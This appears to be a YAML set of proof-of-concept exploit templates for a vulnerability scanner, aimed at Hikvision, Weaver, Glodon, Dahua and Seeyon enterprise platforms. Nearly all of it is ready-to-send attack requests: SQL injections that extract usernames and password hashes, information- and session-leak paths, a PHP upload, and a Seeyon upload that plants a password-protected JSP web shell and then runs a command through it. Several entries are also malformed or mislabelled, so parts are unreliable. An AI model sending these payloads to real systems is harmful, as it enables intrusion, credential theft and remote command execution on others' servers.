poc_content:
  - id: "HiKVISION综合安防管理平台env信息泄漏"
    info:
      name: "HiKVISION综合安防管理平台env信息泄漏"
      author: "小燕子"
      severity: "High"
      verified: true
      description: "app=\"HIKVISION-综合安防管理平台\""
    rules:
      rule:
        requests:
          method: "GET"
          path: "/artemis-portal/artemis/env"
          cookie: "20230925"
          allow_redirects: true
          headers:
            content-type: "application/json"
            user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
            cookie:
          body: ""
        matchers: "strings.Contains(string(respBody), "bootstrapProperties") && strings.Contains(string(respBody), "profiles") && resp.StatusCode == 200"

  - id: "FanWei-FileRead"
    info:
      name: "FanWei-FileRead漏洞"
      author: "小燕子"
      severity: "High"
      verified: false
      description: "泛微OA文件读取漏洞"
    rules:
      rule:
        requests:
          method: "GET"
          path: "/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml"
          allow_redirects: false
          headers:
            content-type: "application/x-www-form-urlencoded"
            user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
            cookie:
          body:
        matchers: ""

  - id: "广联达Linkworks_GetIMDictionary_SQL"
    info:
      name: "广联达Linkworks_GetIMDictionary_SQL注入漏洞"
      author: "小燕子"
      severity: "High"
      verified: false
      description: "body=\"/Services/Identification/\""
    rules:
      rule:
        requests:
          method: "POST"
          path: "/Webservice/IM/Config/ConfigService.asmx/GetIMDictionary"
          allow_redirects: false
          headers:
            content-type: "application/x-www-form-urlencoded"
            user-agent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
            cookie: 
          body: "key=1' UNION ALL SELECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --"
        matchers: ""

  - id: "泛微OA-E-Office-uploadify 文件上传"
    info:
      name: "泛微OA-E-Office-uploadify 文件上传"
      author: "小燕子"
      severity: "critical"
      verified: true
      description: "app=\"泛微-EOffice\""
    rules:
      rule:
        requests:
          method: "POST"
          path: "/inc/jquery/uploadify/uploadify.php"
          allow_redirects: false
          headers:
            content-type: "multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4"
            user-agent: " Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
            cookie: ""
          body: "\
              --e64bdf16c554bbc109cecef6451c26a4\r\n\
              Content-Disposition: form-data; name=\"Filedata\"; filename=\"qax.php\"\r\n\
              Content-Type: image/jpeg\r\n\
              \r\n\
              <?php echo \"qax-test\";unlink(__FILE__);?>\r\n\
              "
        matchers: "lengthFunc(r\\.Text, 10) && equalsFunc(r\\.StatusCode, 200)"
  - id: "广联达Linkworks_GetIMDictionary_SQL"
    info:
      name: "广联达Linkworks_GetIMDictionary_SQL"
      author: "小燕子"
      severity: "critical"
      verified: true
      description: "body=\"/Services/Identification/\""
    rules:
      rule:
        requests:
          method: "POST"
          path: "/Webservice/IM/Config/ConfigService.asmx/GetIMDictionary"
          allow_redirects: false
          headers:
            content-type: ""
            user-agent:  " Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
            cookie: ""
          body: "key=1' UNION ALL SELECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --"
        matchers: "regexFunc(\"\\[0\\-9a\\-fA\\-F\\]\\{32\\}\", r\\.Text)"  
  - id: "大华智慧园区综合管理平台SQL"
    info:
      name: "大华智慧园区综合管理平台SQL"
      author: "小燕子"
      severity: "critical"
      verified: true
      description: "app=\"dahua-智慧园区综合管理平台\""
    rules:
      rule:
        requests:
          method: "GET"
          path: "/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B"orderBy":"1%20and%201=updatexml(1,concat(0x7e,(select%20MD5(123456)),0x7e),1)--"%7D/extend/%7B%7D"
          allow_redirects: false
          headers:
            content-type: ""
            user-agent:  " Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"
            cookie: ""
          body: ""
        matchers: "containsFunc(r\\.Text, \"e10adc3949ba59abbe56e057f20f883\")"



  - id: "致远OA v8文件上传漏洞"
      info:
        name: "致远OA v8文件上传漏洞漏洞"
        author: "小燕子"
        severity: "High"
        verified: false
        description: "app=\"通达OA\""
      rules:
        rule0:
          requests:
            method: "GET"
            path: "/seeyon/wpsAssistServlet"
            allow_redirects: true
            headers:
              content-type: "application/x-www-form-urlencoded"
              user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
              cookie: ""
              TestCmd: ""
            body: ""
          matchers: "containsFunc(r\\.Text, \"flag is empty\") && equalsFunc(r\\.StatusCode, 200)"
        rule1:
          requests:
            method: ""
            path: ""
            allow_redirects: false
            headers:
              content-type: ""
              user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
              cookie: ""
              TestCmd: ""
            body: ""
          matchers: ""

  - id: "致远OA A6 test.jsp SQL注入漏洞"
      info:
        name: "致远OA A6 test.jsp SQL注入漏洞"
        author: "小燕子"
        severity: "High"
        verified: false
        description: "app=\"致远OA\""
      rules:
        rule0:
          requests:
            method: "GET"
            path: "/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5(123))"
            allow_redirects: true
            headers:
              content-type: "application/x-www-form-urlencoded"
              user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
              cookie: ""
              TestCmd: ""
            body: ""
          matchers: "containsFunc(r\\.Text, \"202cb962ac59075b964b07152d234b70\") && equalsFunc(r\\.StatusCode, 200)"
        rule1:
          requests:
            method: ""
            path: ""
            allow_redirects: false
            headers:
              content-type: ""
              user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
              cookie: ""
              TestCmd: ""
            body: ""
          matchers: ""

  - id: "致远OA getSessionList.jsp Session泄漏漏洞"
      info:
        name: "致远OA getSessionList.jsp Session泄漏漏洞"
        author: "小燕子"
        severity: "High"
        verified: false
        description: "app=\"致远OA\""
      rules:
        rule0:
          requests:
            method: "GET"
            path: "/yyoa/ext/https/getSessionList.jsp?cmd=getAll"
            allow_redirects: true
            headers:
              content-type: "application/x-www-form-urlencoded"
              user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
              cookie: ""
              TestCmd: ""
            body: ""
          matchers: "containsFunc(r\\.Text, \"SessionList\") && containsFunc(r\\.Text, \"seesionID\") && equalsFunc(r\\.StatusCode, 200)"
        rule1:
          requests:
            method: ""
            path: ""
            allow_redirects: false
            headers:
              content-type: ""
              user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
              cookie: ""
              TestCmd: ""
            body: ""
          matchers: ""

  - id: "通达htmlofficeservlet命令执行"
      info:
        name: "通达htmlofficeservlet命令执行漏洞"
        author: "小燕子"
        severity: "High"
        verified: false
        description: "app=\"致远OA\""
      rules:
        rule0:
          requests:
            method: "POST"
            path: "/seeyon/htmlofficeservlet"
            allow_redirects: true
            headers:
              content-type: "application/x-www-form-urlencoded"
              user-agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36"
              cookie: ""
              TestCmd: ""
            body: "\
                Cache-Control: max-age=0\r\n\
                Content-Type: application/x-www-form-urlencoded\r\n\
                User-Agent: Mozilla/5.0(Windows NT 10.0;Win64;x64) AppleWebKit/537.36(KHTML, likeGecko) Chrome/92.0.4515.159 Safari/537.36\r\n\
                Accept-Encoding: gzip, deflate\r\n\
                Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n
                Connection: close\r\n
                \r\n\          
                DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV\r\n\
                OPTION=S3WYOSWLBSGr
                currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\n\
                CREATEDATE=wUghPB3szB3Xwg66\r\n\
                RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\n\
                originalFileId=wV66\r\n\
                originalCreateDate=wUghPB3szB3Xwg66\r\n\
                FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6\r\n\
                needReadFile=yRWZdAS6\r\n\
                originalCreateDate=wLSGP4oEzLKAz4=iz=66\r\n\
                <%@ page language=\"java\" import=\"java.util.*,java.io.*\" pageEncoding=\"UTF-8\"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+\"\\n\");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%if(\"asasd3344\".equals(request.getParameter(\"pwd\"))&&!\"\".equals(request.getParameter(\"cmd\"))){out.println(\"<pre>\"+excuteCmd(request.getParameter(\"cmd\")) + \"</pre>\");}else{out.println(\":-)\");}%>6e4f045d4b8506bf492ada7e3390d7ce\r\n
                "
          matchers: ""
        rule1:
          requests:
            method: "GET"
            path: "/seeyon/test123456.jsp?pwd=asasd3344&cmd=ipconfig"
            allow_redirects: false
            headers:
              content-type: "application/x-www-form-urlencoded"
              user-agent: "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"
              cookie: ""
              TestCmd: ""
            body: ""
          matchers: "containsFunc(r\\.Text, \"Windows IP\")"